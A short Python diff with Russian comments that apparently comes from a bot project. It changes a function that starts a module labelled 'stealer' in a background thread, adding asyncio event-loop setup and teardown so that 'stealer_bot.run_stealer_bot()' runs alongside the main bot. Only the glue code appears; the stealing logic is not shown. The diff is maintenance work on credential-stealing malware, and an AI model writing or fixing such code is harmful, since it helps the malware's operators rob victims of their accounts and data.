@@ -45,12 +45,19 @@ _AUTO_MON = {}
 
 # ===================== СТИЛЕР: ЗАПУСК В ОТДЕЛЬНОМ ПОТОКЕ =====================
 def _run_stealer_in_thread():
-    """Стилер запускается в отдельном потоке, чтобы не блокировать основной бот."""
+    import asyncio
     import stealer_bot
     try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         stealer_bot.run_stealer_bot()
     except Exception as e:
         log.error("stealer_bot crashed: %s", e)
+    finally:
+        try:
+            loop.close()
+        except Exception:
+            pass
 
 def start_stealer_bot():
     """Запускает стилер в фоне."""
